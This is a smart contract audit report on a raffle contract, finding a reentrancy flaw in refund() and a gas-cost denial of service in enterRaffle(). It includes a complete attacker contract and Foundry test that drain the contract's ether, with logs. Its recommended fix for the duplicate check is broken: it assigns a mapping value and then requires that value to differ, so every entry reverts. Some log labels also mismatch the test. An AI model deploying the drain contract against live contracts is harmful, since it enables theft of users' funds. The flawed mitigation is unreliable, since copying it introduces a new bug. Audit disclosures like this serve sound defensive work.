# High
### [H-#] Reentrancy attack vulnerability found in `PuppyRaffle::refund` allows entrants to drain contract balance

**Description:** The `PuppyRaffle::refund` function does not follow the best practices of [Checks-Effects-Interactions (CEI)](https://www.cyfrin.io/glossary/reentrancy-attack). 

As a result, entrants are able repeatedly call for refunds before the contract can update the state by performing an external call `sendValue` before updating the contract state. 

This creates a reentrancy vulnerability where a malicious contract could repeatedly call refund and drain the contract's funds before the player's address is cleared from the `players` array.

```js
function refund(uint256 playerIndex) public {    
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
@>  payable(msg.sender).sendValue(entranceFee);

@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact:** An attacker could drain and steal all fees paid by the raffle entrants.

**Proof of Concept:** An attacker could create a contract that:

1. Enters the raffle

2. Calls refund from the contract's receive/fallback function

2. Re-enters the refund function multiple times before players[playerIndex] is set to address(0)

This could drain contract funds by obtaining multiple refunds for a single entrance fee.

We've tested this with the following outcome:

````
**OUTPUT:**
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] test_ReentrancyRefund() (gas: 636687)

Logs: 
- starting attacker contract balance:  0

- starting contract balance:  4000000000000000000

- attacker contract balance after attack:  5000000000000000000

- contract balance after attack:  0
````

**Proof of Code:**
<details>
<summary>PoC</summary>
Add this below your test suite in `PuppyRaffleTest.sol` file

```js
/**
 * @title ReentrancyAttacker
 * @dev A malicious contract demonstrating a reentrancy attack on PuppyRaffle's refund function
 */
contract ReentrancyAttacker {
    // Target contract to attack
    PuppyRaffle public immutable puppyRaffle;
    // Stores the entrance fee amount
    uint256 public immutable entranceFee;
    // Tracks the attacker's player index in the raffle
    uint256 public attackerIndex;

    /**
     * @dev Initializes the attacker contract with the target PuppyRaffle
     * @param _puppyRaffle The vulnerable PuppyRaffle contract address
     */
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    /**
     * @dev Initiates the attack by entering the raffle and immediately requesting a refund
     * @notice The attack begins when this contract's fallback/receive functions are triggered
     */
    function attack() external payable {
        // Enter the raffle with this contract as the only player
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        // Store our player index for subsequent refund calls
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        // Trigger the initial refund (will re-enter through fallback)
        puppyRaffle.refund(attackerIndex);
    }

    /**
     * @dev Internal function to repeatedly call refund while funds remain
     * @notice This is the core of the reentrancy attack
     */
    function _stealMoney() internal {
        // Continue attacking while the raffle has funds
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    /**
     * @dev Fallback function triggered when receiving ETH without data
     * @notice This enables reentrancy during the refund process
     */
    fallback() external payable {
        _stealMoney();
    }

    /**
     * @dev Receive function triggered when receiving plain ETH
     * @notice This enables reentrancy during the refund process
     */
    receive() external payable {
        _stealMoney();
    }
}
```

Add this inside your test suite in `PuppyRaffleTest.sol` file

```js
function test_ReentrancyRefund() public {
    // Setup: Create 4 legitimate players
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // Deploy attacker contract and fund the attack wallet
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    // Record pre-attack balances for comparison
    uint256 startingAttackerContractBalance = address(attackerContract).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    // Execute attack (reentrancy exploit)
    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    // Log results for debugging
    console.log("starting attacker contract balance: ", startingAttackerContractBalance);
    console.log("starting contract balance: ", startingContractBalance);
    console.log("attacker contract balance after attack: ", address(attackerContract).balance);
    console.log("contract balance after attack: ", address(puppyRaffle).balance);
}
```

</details>

#

**Recommended Mitigation:** To fix this, we should have the PuppyRaffle::refund function update the players array before making the external call. Additionally, we should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+   players[playerIndex] = address(0);
+   emit RaffleRefunded(playerAddress);

    payable(msg.sender).sendValue(entranceFee);

-   players[playerIndex] = address(0);
-   emit RaffleRefunded(playerAddress);
}
```

See also [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)

#

# Medium
### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack. It leads to incrementing gas costs for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, teh longer the array gets, the more checks have to be made. This results in significantly higher gas costs for those who enter the raffle later. Every additional address is an additional check that the loop will have to make. 

```js
// @audit DoS Attack
@>   for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(
                players[i] != players[j],
                "PuppyRaffle: Duplicate player"
            );
        }
    }
```

**Impact:** Gas cost for raffle entrants will greatly increase as more players enter the raffle, discouraging later entrants and causing a rush at start of a raffle. 

An attacker could make the `PuppyRaffle::enterRaffle` arry so big that on one else could enter, thus guaranteeing themselves the winner. 

**Proof of Concept:** If we have 2 sets of 100 players enter, the gas costs will be:
- 1st set:  6,503,275 gas
- 2nd set: 18,995,515 gas

The result shows the it is over 3x more expensive for entrants in the second round

<details>
<summary>PoC</summary>
Place this test into `PuppyRaffleTest.t.sol`

```js
function test_denialOfService() public {    
    vm.txGasPrice(1);

    // Let's enter 100 players
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    // check how much gas it takes to enter round of 100 players
    uint256 gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    uint256 gasAfter = gasleft();
    uint256 gasUsedFirst = (gasBefore - gasAfter) * tx.gasprice;
    console.log("Gas used for 1000 players: ", gasUsedFirst);

    // a second round
    address[] memory playersTwo = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        playersTwo[i] = address(i + playersNum);
    }
    // check how much gas it takes to enter round of 100 players
    uint256 gasBeforeSecond = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(
        playersTwo
    );
    uint256 gasAfterSecond = gasleft();
    uint256 gasUsedSecond = (gasBeforeSecond - gasAfterSecond) *
        tx.gasprice;
    console.log("Gas used for second round 1000 players: ", gasUsedSecond);

    assert(gasUsedFirst < gasUsedSecond);
}
```
 
**OUTPUT:**
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] test_denialOfService() (gas: 25536100)

    Logs:
    Gas used for 1st 100 players:  6503275.
    Gas used for 2nd 100 players:  18995515.

</details>

#

**Recommended Mitigation:** Here are a few recomendations.
1. Consider allowing duplicates. - Since users can make new wallet addresses, the duplicate check doesn't fully prevent players from entering multiple times. It only blocks same wallet addresses.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

**Alternatively**, you could use [OpenZeppelin's `EnumerableSet` library.](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet)   